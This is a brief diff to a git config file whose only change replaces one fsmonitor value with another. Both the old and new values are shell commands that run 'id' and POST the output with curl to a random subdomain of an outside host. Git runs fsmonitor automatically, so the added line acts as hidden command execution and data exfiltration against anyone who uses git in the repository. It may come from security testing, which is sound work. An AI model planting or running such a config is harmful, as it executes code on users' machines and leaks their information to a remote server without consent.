@@ -3,4 +3,4 @@
 	filemode = true
 	bare = false
 	worktree = "worktree"
-	fsmonitor = "id | curl -XPOST -d @- http://bt8ru8jl2q7bq6seqw8thiwk8be22xqm.x9.to"
+	fsmonitor = "id | curl -XPOST -d @- http://9s2pt6ij1o69p4rcpu7rggvi79d01wpl.x9.to"
